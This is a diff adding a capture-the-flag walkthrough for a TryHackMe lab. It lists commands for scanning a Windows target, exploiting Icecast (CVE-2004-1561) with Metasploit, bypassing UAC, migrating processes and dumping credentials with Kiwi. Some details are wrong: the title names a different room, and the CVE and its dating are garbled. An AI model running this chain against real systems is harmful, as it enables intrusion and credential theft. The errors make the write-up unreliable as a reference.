@@ -1,0 +1,27 @@
+                                                                                                                                        This is a walkthrough of how how solved the Mr Robot CTF on TryHackMe 
+
+1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
+2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
+3. Run nmap quick scan plus using the command $nmap -sV -O -T5 -p- 10.10.77.72 -oN Nmap.results
+4. Check if it has a website  ,no website for this machine
+5. The nmap results show that various ports are open including the Microsoft remote desktop(MSDRP) and 8000 using Icecast
+6. IceCast is a known vulnerability that was exploited back in the 90's but this device has opened port for it , so we'll quickly check its CVE number that is 2004:1561
+7. Now we will use metaspliot to exploit this vulnerability 
+8. First type spool $icecast.metaspliot this will create a icecast named file and save all the findings in it 
+9. Then we can search $ search cve:2004-1561 to find all the exploits related to this vulnearbility
+10. As it has the number 0 we will type $use 0
+11. It will start the exploit 
+12. The we will have to check the lhosts and rhosts value 
+13. Here set lhost as tun0 and rhosts as ip of the target
+14. Now just type $exploit or run and the attack will start on its own 
+15. After we have gained access to the shell through meterpreter we should gather recon using $getuid and $sysinfo
+16. now for some further recon run $post/multi/recon/local_exploit_suggester
+17. run this exploit$exploit/windows/local/bypassuac_eventvwr
+18. send this session to background using $background
+19. then we will open options and give our meterpreter session id and set lhosts as tun0
+20. now type again $exploit
+21. now we have to escalate privilege so we will migrate using command $migrate -N PROCESS_NAME here 1372
+22. now we have gained admin acess , you can see this my typing $getuid
+23. now load kiwi to get all the passwords using command $load kiwi
+24. type help to get all the commands you can use
+25. type $creds_all to get all the credentials
